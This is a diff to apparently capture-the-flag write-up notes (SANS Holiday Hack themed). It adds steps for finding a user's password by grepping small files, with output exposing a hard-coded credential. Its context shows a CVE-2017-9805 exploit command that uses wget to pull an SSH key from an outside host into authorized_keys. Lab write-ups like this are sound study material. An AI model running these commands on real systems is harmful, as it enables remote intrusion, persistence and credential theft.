@@ -282,6 +282,19 @@ Used the Python tool in the SANS blog post:
 python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 'mkdir /home/alabaster_snowball/.ssh; cd /home/alabaster_snowball/.ssh; wget http://1.2.3.4/a.key -O authorized_keys; chmod 600 authorized_keys; chmod 700 .'
 #+END_SRC
 
+*** Finding the password for alabaster_snowball 
+
+Find all small files owned by alabaster_snowball on the main filesystem and search them for the string password.
+Start small and double the filesize each time to keep the process fast.
+
+#+BEGIN_SRC sh
+alabaster_snowball@l2s:/tmp/asnow.Pl0FLAV4ubwwtLX5OjB1ZrCb$ find / -xdev -type f -user alabaster_snowball -size -1k 2>/dev/null |xargs grep passwor
+alabaster_snowball@l2s:/tmp/asnow.Pl0FLAV4ubwwtLX5OjB1ZrCb$ find / -xdev -type f -user alabaster_snowball -size -2k 2>/dev/null |xargs grep passwor
+alabaster_snowball@l2s:/tmp/asnow.Pl0FLAV4ubwwtLX5OjB1ZrCb$ find / -xdev -type f -user alabaster_snowball -size -4k 2>/dev/null |xargs grep passwor
+/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String password = "stream_unhappy_buy_loss";
+#+END_SRC
+
+
 #+BEGIN_SRC sh
 ssh l2s | tee nmap.out
 #+END_SRC
